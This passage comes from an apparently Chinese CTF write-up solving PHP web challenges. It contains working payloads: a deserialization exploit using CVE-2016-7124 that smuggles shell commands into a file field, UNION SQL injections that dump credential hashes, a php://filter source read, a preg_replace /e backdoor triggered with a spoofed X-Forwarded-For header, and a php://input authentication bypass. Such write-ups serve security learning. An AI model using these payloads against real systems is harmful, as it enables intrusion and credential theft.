class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span><span class="params">()</span></span></div><div class="line">    &#123;</div><div class="line">        <span class="keyword">$this</span>-&gt;file = <span class="string">'wakeup.txt'</span>;</div><div class="line">    &#125;</div><div class="line"></div><div class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span></span></div><div class="line">    &#123;</div><div class="line">        <span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;file != <span class="string">'wakeup.txt'</span> &amp;&amp; <span class="keyword">$this</span>-&gt;file != <span class="string">'sleep.txt'</span> &amp;&amp; <span class="keyword">$this</span>-&gt;file != <span class="string">'Welcome'</span>) &#123;</div><div class="line">        	system(<span class="string">"php ./import/$this-&gt;file.php"</span>);</div><div class="line">        &#125;<span class="keyword">else</span>&#123;</div><div class="line">        	<span class="keyword">echo</span> <span class="string">"&lt;?php Something destroyed ?&gt;"</span>;</div><div class="line">        &#125;</div><div class="line">    &#125;</div><div class="line"></div><div class="line"></div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>在<code>__destruct</code>阶段，进行了system操作，但在反序列化时<code>__wakeup</code>方法的调用会设置file为<code>wakeup.txt</code>，CVE-2016-7124中提到可以如果被反序列话的字符串其中对应的对象的属性个数发生变化时，会导致反序列化失败而同时使得__wakeup失效。因此可以绕过，也即file字段可控，且没有过滤。</p>
<p>由前分析，由于不允许出现<code>./</code>，我们考虑先获得绝对路径。</p>
<p>在class.php中，将<code>sleep</code>方法注释掉，在尾部添加</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">$b =<span class="keyword">new</span> Record(<span class="string">'Flag.php &amp;&amp; pwd &amp;&amp; pwd &amp;&amp; cat waf'</span>);</div><div class="line">$c = serialize($b);</div><div class="line"><span class="keyword">echo</span> $c;</div></pre></td></tr></table></figure>
<p>这样在执行时即执行：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">system(&quot;php ./import/Flag.php &amp;&amp; pwd &amp;&amp; pwd &amp;&amp; cat waf.php&quot;);</div></pre></td></tr></table></figure></p>
<p>pwd是为了获取当前路径，之后的是因为有一个<code>.php</code>的后缀。得到；<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">O:6:&quot;Record&quot;:1:&#123;s:4:&quot;file&quot;;s:33:&quot;Flag.php &amp;&amp; pwd &amp;&amp; pwd &amp;&amp; cat waf&quot;;&#125;</div></pre></td></tr></table></figure></p>
<p>修改为：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">O:6:&quot;Record&quot;:2:&#123;s:4:&quot;file&quot;;s:33:&quot;Flag.php &amp;&amp; pwd &amp;&amp; pwd &amp;&amp; cat waf&quot;;&#125;</div></pre></td></tr></table></figure></p>
<p>url编码后访问：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://47.104.99.231:20003/index2.php?ad=1%00--&amp;secret=O%3A6%3A%22Record%22%3A2%3A%7Bs%3A4%3A%22file%22%3Bs%3A33%3A%22Flag.php%20%26%26%20pwd%20%26%26%20pwd%20%26%26%20cat%20waf%22%3B%7D</div></pre></td></tr></table></figure></p>
<p><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20180118/2.jpg?raw=true" alt=""></p>
<p>获得绝对路径为/var/www/html。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">$b =new Record(&apos;Flag.php &amp;&amp; pwd &amp;&amp; cat /var/www/html/import/Flag&apos;);</div><div class="line">$c = serialize($b);</div><div class="line">echo $c;</div></pre></td></tr></table></figure>
<p>得到：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">O:6:&quot;Record&quot;:1:&#123;s:4:&quot;file&quot;;s:48:&quot;Flag.php &amp;&amp; pwd &amp;&amp; cat /var/www/html/import/Flag&quot;;&#125;</div></pre></td></tr></table></figure></p>
<p>修改为：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">O:6:&quot;Record&quot;:2:&#123;s:4:&quot;file&quot;;s:48:&quot;Flag.php &amp;&amp; pwd &amp;&amp; cat /var/www/html/import/Flag&quot;;&#125;</div></pre></td></tr></table></figure></p>
<p>url编码，访问：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://47.104.99.231:20003/index2.php?ad=1%00--&amp;secret=O%3A6%3A%22Record%22%3A2%3A%7Bs%3A4%3A%22file%22%3Bs%3A48%3A%22Flag.php%20%26%26%20pwd%20%26%26%20cat%20%2fvar%2fwww%2fhtml%2fimport%2fFlag%22%3B%7D</div></pre></td></tr></table></figure></p>
<p><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20180118/1.jpg?raw=true" alt=""></p>
<p>flag如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">flag&#123;g_i_i_t_is_unsafe_ahhhahahah&#125;</div></pre></td></tr></table></figure></p>
<h1 id="工控管理系统新版本"><a href="#工控管理系统新版本" class="headerlink" title="工控管理系统新版本"></a>工控管理系统新版本</h1><h2 id="题目-2"><a href="#题目-2" class="headerlink" title="题目"></a>题目</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">云工控管理系统新添加的登录和注册页面存在漏洞，请找出flag。</div><div class="line">http://47.104.1.173:20004/</div></pre></td></tr></table></figure>
<h2 id="Solution-2"><a href="#Solution-2" class="headerlink" title="Solution"></a>Solution</h2><p>findpwd.php有注入漏洞<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">POST:</div><div class="line">username=w&apos; UNION ALL SELECT 32,32,CONCAT((SELECT+GROUP_CONCAT(schema_name+SEPARATOR+0x3c62723e)+FROM+INFORMATION_SCHEMA.SCHEMATA)),32#</div><div class="line"></div><div class="line">information_schema&lt;br&gt;cetc004&lt;br&gt;mysql&lt;br&gt;performance_schema&lt;br&gt;</div></pre></td></tr></table></figure></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">username=w&apos; UNION ALL SELECT 32,32,CONCAT((SELECT+GROUP_CONCAT(table_name+SEPARATOR+0x3c62723e)+FROM+INFORMATION_SCHEMA.TABLES+WHERE+TABLE_SCHEMA=0x63657463303034)),32#</div><div class="line"></div><div class="line"></div><div class="line">admin&lt;br&gt;user&lt;br&gt;</div></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">username=w&apos; UNION ALL SELECT 32,32,CONCAT((SELECT+GROUP_CONCAT(column_name+SEPARATOR+0x3c62723e)+FROM+INFORMATION_SCHEMA.COLUMNS+WHERE+TABLE_NAME=0x61646d696e)),32#</div><div class="line"></div><div class="line">username&lt;br&gt;password&lt;br&gt;question&lt;br&gt;answer&lt;br&gt;</div></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">username=w&apos; UNION ALL SELECT 32,32,CONCAT((SELECT+GROUP_CONCAT(username,0x20,password,0x20,question,0x20,answer)+FROM+cetc004.admin)),32#</div><div class="line"></div><div class="line">c3tlwDmIn23 2f8667f381ff50ced6a3edc259260ba9 cetc cdwcewf2e3235y7687jnhbvdfcqsx12324r45y687o98kynbgfvds</div></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line">username=w&apos; UNION ALL SELECT 32,32,CONCAT((SELECT+GROUP_CONCAT(username,0x20,password,0x20,question,0x20,answer+SEPARATOR+0x3c62723e)+FROM+cetc004.user)),32#</div><div class="line"></div><div class="line">c3tlwDmIn23 2f8667f381ff50ced6a3edc259260ba9 cetc cdwcewf2e3235y7687jnhbvdfcqsx12324r45y687o98kynbgfvds&lt;br&gt;</div><div class="line">1 c4ca4238a0b923820dcc509a6f75849b 1 1&lt;br&gt;</div><div class="line">admin c4ca4238a0b923820dcc509a6f75849b 1 1&lt;br&gt;</div><div class="line">root c81e728d9d4c2f636f067f89cc14862c 1 1&lt;br&gt;</div><div class="line">&apos; 024c94d6e03b6f67a86b952b914816c7 &apos; &apos;&lt;br&gt;</div><div class="line">xxoo e10adc3949ba59abbe56e057f20f883e 123456 123456</div></pre></td></tr></table></figure>
<h1 id="工控云管理系统设备维护中心被植入后门"><a href="#工控云管理系统设备维护中心被植入后门" class="headerlink" title="工控云管理系统设备维护中心被植入后门"></a>工控云管理系统设备维护中心被植入后门</h1><h2 id="题目-3"><a href="#题目-3" class="headerlink" title="题目"></a>题目</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">其他破坏者会利用工控云管理系统设备维护中心的后门入侵系统</div><div class="line">http://47.104.74.209:20005</div></pre></td></tr></table></figure>
<h2 id="Solution-3"><a href="#Solution-3" class="headerlink" title="Solution"></a>Solution</h2><p>利用page参数和php伪协议读取源码</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line">GET /index.php?page=php://filter/read=convert.base64-encode/resource=index.php HTTP/1.1</div><div class="line">Host: 47.104.74.209:20005</div><div class="line">User-Agent: Mozilla/5.0 (Windows NT 6.3; Win64; x64; rv:56.0) Gecko/20100101 Firefox/56.0</div><div class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8</div><div class="line">Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3</div><div class="line">Accept-Encoding: gzip, deflate</div><div class="line">Cookie: PHPSESSID=j0mvnceqjlehu86vidl4hcs986</div><div class="line">Connection: close</div><div class="line">Upgrade-Insecure-Requests: 1</div></pre></td></tr></table></figure>
<p>得到index.php源码，其中第121行：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div></pre></td><td class="code"><pre><div class="line"><span class="comment">//方便的实现输入输出的功能,正在开发中的功能，只能内部人员测试</span></div><div class="line"></div><div class="line"><span class="keyword">if</span> ($_SERVER[<span class="string">'HTTP_X_FORWARDED_FOR'</span>] === <span class="string">'127.0.0.1'</span>) &#123;</div><div class="line"></div><div class="line">    <span class="keyword">echo</span> <span class="string">"&lt;br &gt;Welcome My Admin ! &lt;br &gt;"</span>;</div><div class="line"></div><div class="line">    $pattern = $_GET[pat];</div><div class="line">    $replacement = $_GET[rep];</div><div class="line">    $subject = $_GET[sub];</div><div class="line"></div><div class="line">    <span class="keyword">if</span> (<span class="keyword">isset</span>($pattern) &amp;&amp; <span class="keyword">isset</span>($replacement) &amp;&amp; <span class="keyword">isset</span>($subject)) &#123;</div><div class="line">        preg_replace($pattern, $replacement, $subject);</div><div class="line">    &#125;<span class="keyword">else</span>&#123;</div><div class="line">        <span class="keyword">die</span>();</div><div class="line">    &#125;</div><div class="line"></div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
<p>这里存在后门，添加头部和对应GET字段。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line">GET /index.php?pat=/(.*)/e&amp;rep=system(&apos;ls&apos;)&amp;sub=aa HTTP/1.1</div><div class="line">Host: 47.104.74.209:20005</div><div class="line">User-Agent: Mozilla/5.0 (Windows NT 6.3; Win64; x64; rv:56.0) Gecko/20100101 Firefox/56.0</div><div class="line">X-Forwarded-For: 127.0.0.1</div><div class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8</div><div class="line">Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3</div><div class="line">Accept-Encoding: gzip, deflate</div><div class="line">Cookie: PHPSESSID=j0mvnceqjlehu86vidl4hcs986</div><div class="line">Connection: close</div><div class="line">Upgrade-Insecure-Requests: 1</div></pre></td></tr></table></figure></p>
<p>发现一个目录s3chahahaDir，之后还有一个目录flag，里面有flag.php<br><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20180118/3.jpg?raw=true" alt=""></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line">GET /index.php?pat=/(.*)/e&amp;rep=system(&apos;cat+s3chahahaDir/flag/flag.php&apos;)&amp;sub=aa HTTP/1.1</div><div class="line">Host: 47.104.74.209:20005</div><div class="line">User-Agent: Mozilla/5.0 (Windows NT 6.3; Win64; x64; rv:56.0) Gecko/20100101 Firefox/56.0</div><div class="line">X-Forwarded-For: 127.0.0.1</div><div class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8</div><div class="line">Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3</div><div class="line">Accept-Encoding: gzip, deflate</div><div class="line">Cookie: PHPSESSID=j0mvnceqjlehu86vidl4hcs986</div><div class="line">Connection: close</div><div class="line">Upgrade-Insecure-Requests: 1</div></pre></td></tr></table></figure>
<p>得到flag：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">flag&#123;SecuriTY_Preg_eee3&#125;</div></pre></td></tr></table></figure></p>
<h1 id="工控云管理系统客服中心期待您的反馈"><a href="#工控云管理系统客服中心期待您的反馈" class="headerlink" title="工控云管理系统客服中心期待您的反馈"></a>工控云管理系统客服中心期待您的反馈</h1><h2 id="题目-4"><a href="#题目-4" class="headerlink" title="题目"></a>题目</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">工控云管理系统客服中心存在漏洞，flag就在flag/flag/flag/flag/flag/flag/flag.php文件里面</div><div class="line">http://47.104.188.226:20001</div><div class="line"></div><div class="line">请找到这个隐藏的文件，swp？不不不。。。再找找。。</div></pre></td></tr></table></figure>
<h2 id="Solution-4"><a href="#Solution-4" class="headerlink" title="Solution"></a>Solution</h2><p>有一个上传功能：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://47.104.188.226:20001/includes/upload.php</div></pre></td></tr></table></figure></p>
<p>存在swn,swo,swp文件泄露：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">http://47.104.188.226:20001/.index.php.swp</div><div class="line">http://47.104.188.226:20001/.index.php.swo</div><div class="line">http://47.104.188.226:20001/.index.php.swn</div></pre></td></tr></table></figure></p>
<p>但实际上只有swo，可以直接看到源码：view-source:<a href="http://47.104.188.226:20001/.index.php.swo" target="_blank" rel="external">http://47.104.188.226:20001/.index.php.swo</a><br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div><div class="line">77</div><div class="line">78</div><div class="line">79</div><div class="line">80</div><div class="line">81</div><div class="line">82</div><div class="line">83</div><div class="line">84</div><div class="line">85</div><div class="line">86</div><div class="line">87</div><div class="line">88</div><div class="line">89</div><div class="line">90</div><div class="line">91</div><div class="line">92</div><div class="line">93</div><div class="line">94</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line">error_reporting(<span class="number">0</span>);</div><div class="line">ini_set(<span class="string">'open_basedir'</span>, <span class="string">'/var/www/html'</span>);</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">function</span> <span class="title">autoload</span><span class="params">($page)</span> </span>&#123;</div><div class="line">    <span class="keyword">if</span> (stripos($_SERVER[<span class="string">'QUERY_STRING'</span>], <span class="string">'flag'</span>) &gt; <span class="number">0</span>) &#123;</div><div class="line">      <span class="keyword">die</span>(<span class="string">'no flag flag flag flag !'</span>);</div><div class="line">    &#125;</div><div class="line"></div><div class="line">    <span class="keyword">if</span> (stripos($_SERVER[<span class="string">'QUERY_STRING'</span>], <span class="string">'uploaded'</span>) &gt; <span class="number">0</span>) &#123;</div><div class="line">      <span class="keyword">die</span>(<span class="string">'no uploaded uploaded uploaded uploaded !'</span>);</div><div class="line">    &#125;</div><div class="line"></div><div class="line">    <span class="keyword">if</span> (stripos($_SERVER[<span class="string">'QUERY_STRING'</span>], <span class="string">'://f'</span>) &gt; <span class="number">0</span>) &#123;</div><div class="line">      <span class="keyword">die</span>(<span class="string">'no ://f ://f ://f'</span>);</div><div class="line">    &#125;</div><div class="line"></div><div class="line">    <span class="keyword">if</span> (stripos($_SERVER[<span class="string">'QUERY_STRING'</span>], <span class="string">'ata'</span>) &gt; <span class="number">0</span>) &#123;</div><div class="line">      <span class="keyword">die</span>(<span class="string">'no ata ata ata'</span>);</div><div class="line">    &#125;</div><div class="line"></div><div class="line">    <span class="keyword">if</span> (stripos($_SERVER[<span class="string">'QUERY_STRING'</span>], <span class="string">'0'</span>) &gt; <span class="number">0</span>) &#123;</div><div class="line">      <span class="keyword">die</span>(<span class="string">'no 0 0 0'</span>);</div><div class="line">    &#125;</div><div class="line"></div><div class="line">    <span class="keyword">if</span>(file_exists(<span class="string">"./includes/$page.php"</span>)) &#123;</div><div class="line">        <span class="keyword">include</span> <span class="string">"./includes/$page.php"</span>;</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">elseif</span>(file_exists(<span class="string">"./includes/$page"</span>)) &#123;</div><div class="line">        <span class="keyword">include</span> <span class="string">"./includes/$page"</span>;</div><div class="line">    &#125;<span class="keyword">else</span>&#123;</div><div class="line">      <span class="keyword">echo</span> <span class="string">"File is not exit "</span>;</div><div class="line">    &#125;</div><div class="line">&#125;</div><div class="line"></div><div class="line"></div><div class="line"><span class="function"><span class="keyword">function</span> <span class="title">download</span><span class="params">($adfile, $file)</span></span>&#123;</div><div class="line">  <span class="comment">//Only Administrators can download files .</span></div><div class="line">      $cert = <span class="string">'N'</span>;</div><div class="line">    <span class="keyword">if</span>(<span class="keyword">isset</span>($adfile) &amp;&amp; file_get_contents($adfile, <span class="string">'r'</span>) === <span class="string">'Yeah Everything Will Be Ok My Boss'</span>) &#123;</div><div class="line">      <span class="keyword">echo</span> <span class="string">"Welcome ! You Are Administrator !"</span>;</div><div class="line">      $cert = <span class="string">'Y'</span>;</div><div class="line">    &#125;<span class="keyword">else</span>&#123;</div><div class="line">      <span class="keyword">echo</span> <span class="string">"error1"</span>;</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">if</span> ($cert === <span class="string">'Y'</span>)&#123;</div><div class="line">      <span class="keyword">if</span> (stripos($file, <span class="string">'file_list'</span>) != <span class="keyword">false</span>) <span class="keyword">die</span>(<span class="string">'error4'</span>);</div><div class="line">      <span class="keyword">if</span> (stripos($file, <span class="string">'file_list'</span>) &gt;= <span class="number">0</span>) &#123;</div><div class="line">      header(<span class="string">'Content-Description: File Transfer'</span>);</div><div class="line">      header(<span class="string">'Content-Type: application/octet-stream'</span>);</div><div class="line">      header(<span class="string">'Content-Disposition: attachment; filename='</span>. basename($file));</div><div class="line">      header(<span class="string">'Content-Transfer-Encoding: binary'</span>);</div><div class="line">      header(<span class="string">'Expires: 0'</span>);</div><div class="line">      header(<span class="string">'Cache-Control: must-revalidate, post-check=0, pre-check=0'</span>);</div><div class="line">      header(<span class="string">'Pragma: public'</span>);</div><div class="line">      header(<span class="string">'Content-Length: '</span> . filesize($file));</div><div class="line">      readfile($file);</div><div class="line">    &#125;<span class="keyword">else</span>&#123;</div><div class="line">      <span class="keyword">die</span>(<span class="string">'error2'</span>);</div><div class="line">    &#125;</div><div class="line">&#125;<span class="keyword">else</span>&#123;</div><div class="line">  <span class="keyword">echo</span> <span class="string">'error3'</span>;</div><div class="line">&#125;</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>($_GET[<span class="string">'page'</span>])) &#123;</div><div class="line">    $page = <span class="string">'index'</span>;</div><div class="line">&#125;</div><div class="line"><span class="keyword">else</span> &#123;</div><div class="line">    $page = $_GET[<span class="string">'page'</span>];</div><div class="line">&#125;</div><div class="line"><span class="keyword">if</span> (stripos($page, <span class="string">'./'</span>) &gt; <span class="number">0</span>) &#123;</div><div class="line">  <span class="keyword">die</span>(<span class="string">'no ./ ./ ./ ./'</span>);</div><div class="line">&#125;</div><div class="line"><span class="keyword">if</span> (stripos($page, <span class="string">'://'</span>) &gt; <span class="number">0</span>) &#123;</div><div class="line">  <span class="keyword">die</span>(<span class="string">'no :// :// ://'</span>);</div><div class="line">&#125;</div><div class="line">autoload($page);</div><div class="line"></div><div class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_GET[admin]) &amp;&amp; <span class="keyword">isset</span>($_GET[file])) &#123;</div><div class="line"></div><div class="line">  <span class="keyword">if</span> (stripos($_GET[admin], <span class="string">'flag'</span>) &gt; <span class="number">0</span> || stripos($_GET[file], <span class="string">'flag'</span>) &gt; <span class="number">0</span>) &#123;</div><div class="line">    <span class="keyword">die</span>(<span class="string">'not flag flag flag falg !'</span>);</div><div class="line">  &#125;</div><div class="line"></div><div class="line">  <span class="keyword">if</span> (strlen($_GET[file]) &gt;= <span class="number">38</span>) &#123;</div><div class="line">    <span class="keyword">die</span>(<span class="string">'too long'</span>);</div><div class="line">  &#125;</div><div class="line"></div><div class="line">  download($_GET[admin], $_GET[file]);</div><div class="line">&#125;</div><div class="line"></div><div class="line"></div><div class="line"><span class="meta">?&gt;</span></div></pre></td></tr></table></figure></p>
<p>上面这个是index.php的源码，分析起来两个功能：</p>
<ol>
<li>autoload功能，这里提供了一个文件包含，但需要绕过许多限制，后面再说。</li>
<li>download功能，提供了文件下载功能。</li>
</ol>
<p>先利用download功能。在最下面，接受了两个参数<code>admin</code>和<code>file</code>。在download函数中，对<code>admin</code>参数做了检测:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">if(isset($adfile) &amp;&amp; file_get_contents($adfile, &apos;r&apos;) === &apos;Yeah Everything Will Be Ok My Boss&apos;)</div></pre></td></tr></table></figure></p>
<p>结合题目里有上传功能，我们访问：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">http://47.104.188.226:20001/index.php?admin=php://input&amp;file=includes/upload.php</div><div class="line"></div><div class="line">POST:</div><div class="line">Yeah Everything Will Be Ok My Boss</div></pre></td></tr></table></figure></p>
<p><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20180118/5.jpg?raw=true" alt=""></p>
<p>从而获得了upload.php的源码:<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div><div class="line">77</div><div class="line">78</div><div class="line">79</div><div class="line">80</div><div class="line">81</div><div class="line">82</div></pre></td><td class="code"><pre><div class="line">    <span class="meta">&lt;?php</span></div><div class="line"></div><div class="line">    <span class="keyword">if</span> (stripos($_SERVER[<span class="string">'QUERY_STRING'</span>], <span class="string">'flag'</span>) &gt; <span class="number">0</span>) &#123;</div><div class="line">      <span class="keyword">die</span>(<span class="string">'no flag flag flag flag !'</span>);</div><div class="line">    &#125;</div><div class="line"></div><div class="line"></div><div class="line">    <span class="keyword">if</span> (!<span class="keyword">empty</span>($_FILES)) &#123;</div><div class="line"></div><div class="line">    <span class="comment">//properties of the uploaded file</span></div><div class="line">    $name= $_FILES[<span class="string">"filename"</span>][<span class="string">"name"</span>];</div><div class="line">    $type= $_FILES[<span class="string">"filename"</span>][<span class="string">"type"</span>];</div><div class="line">    $size= $_FILES[<span class="string">"filename"</span>][<span class="string">"size"</span>];</div><div class="line">    $temp= $_FILES[<span class="string">"filename"</span>][<span class="string">"tmp_name"</span>];</div><div class="line">    $error= $_FILES[<span class="string">"filename"</span>][<span class="string">"error"</span>];</div><div class="line"></div><div class="line">    <span class="keyword">if</span> (strlen($name) &gt;= <span class="number">6</span>) &#123;</div><div class="line">      <span class="keyword">die</span>(<span class="string">'name is too long !'</span>);</div><div class="line">    &#125;</div><div class="line"></div><div class="line">    <span class="keyword">if</span> (stripos($name, <span class="string">'./'</span>) &gt; <span class="number">0</span>) &#123;</div><div class="line">      <span class="keyword">die</span>(<span class="string">'invalid parameter'</span>);</div><div class="line">    &#125;</div><div class="line"></div><div class="line">    <span class="keyword">if</span> (stripos($name, <span class="string">'php'</span>) &gt; <span class="number">0</span>) &#123;</div><div class="line">      <span class="keyword">die</span>(<span class="string">'invalid parameter'</span>);</div><div class="line">    &#125;</div><div class="line"></div><div class="line">    <span class="keyword">if</span> (substr($name, <span class="number">-3</span>, <span class="number">3</span>) !== <span class="string">'zip'</span> &amp;&amp; substr($name, <span class="number">-3</span>, <span class="number">3</span>) !== <span class="string">'jpg'</span> &amp;&amp; substr($name, <span class="number">-3</span>, <span class="number">3</span>) !== <span class="string">'png'</span>) &#123;</div><div class="line">      <span class="keyword">die</span>(<span class="string">'file can not upload ! '</span>);</div><div class="line">    &#125;</div><div class="line"></div><div class="line"></div><div class="line">    <span class="keyword">if</span> ($error &gt; <span class="number">0</span>)</div><div class="line">        <span class="keyword">die</span>(<span class="string">"Error uploading file! code $error."</span>);</div><div class="line">    <span class="keyword">else</span></div><div class="line">       &#123;</div><div class="line">        <span class="keyword">if</span>($type !== <span class="string">"application/zip"</span> || $size &gt; <span class="number">400</span>)<span class="comment">//condition for the file</span></div><div class="line">        &#123;</div><div class="line">        <span class="keyword">die</span>(<span class="string">"Format not allowed or 